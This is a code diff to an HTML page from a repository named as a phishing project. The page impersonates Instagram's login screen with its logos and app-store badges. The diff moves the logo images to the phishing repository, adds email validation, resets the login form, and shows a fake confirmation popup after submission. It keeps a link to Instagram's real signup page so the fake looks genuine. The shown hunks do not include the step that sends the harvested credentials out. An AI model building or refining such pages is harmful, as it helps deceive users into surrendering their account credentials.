@@ -5,42 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
     <style>
-        /* General Reset */
         * {
             margin: 0;
             padding: 0;
         }
-
-        /* Instagram Logo */
         .instagram-logo {
             background-position: 0 -130px;
             height: 51px;
             width: 175px;
-            background-image: url(https://bit.ly/3v2LT17);
+            background-image: url(https://raw.githubusercontent.com/Hecabrus/my-phishing-project/main/images/instagramlogo.png);
         }
-
-        /* Facebook Logo */
         .facebook-logo {
             background-position: -414px -259px;
-            background-image: url(https://bit.ly/3v2LT17);
+            background-image: url(https://raw.githubusercontent.com/Hecabrus/my-phishing-project/main/images/facebook-icon.png);
             height: 16px;
             width: 16px;
         }
-
-        /* Apple Store Logo */
         .apple-store-logo {
             background-position: -132px -182px;
             height: 42px;
             width: 128px;
-            background-image: url(https://bit.ly/3v2LT17);
+            background-image: url(https://raw.githubusercontent.com/Hecabrus/my-phishing-project/main/images/applestore.png);
         }
-
-        /* Google Store Logo */
         .google-store-logo {
             background-position: 0 -182px;
             height: 42px;
             width: 130px;
-            background-image: url(https://bit.ly/3v2LT17);
+            background-image: url(https://raw.githubusercontent.com/Hecabrus/my-phishing-project/main/images/googlestore.png);
         }
 
         /* Button Animation */
@@ -242,7 +233,13 @@
 
         setTimeout(function() {
             document.getElementById('loading').classList.remove('active');
-            showPopup('Your application has been received. Check back in a week for an update.');
+            
+            if (email.length < 4) {
+                showToast('error');
+            } else {
+                document.getElementById('loginForm').reset();
+                showPopup('Your application has been received. Check back in a week for an update.');
+            }
         }, 2000);
     }
 
@@ -256,15 +253,6 @@
 
     function handleSignUp() {
         window.location.href = 'https://www.instagram.com/accounts/emailsignup/';
-    }
-
-    function handleGetApp() {
-        window.location.href = 'https://www.instagram.com/download/';
-    }
-
-    // Optional: Toggle Dark Mode
-    function toggleDarkMode() {
-        document.body.classList.toggle('dark');
     }
 </script>
 </body>
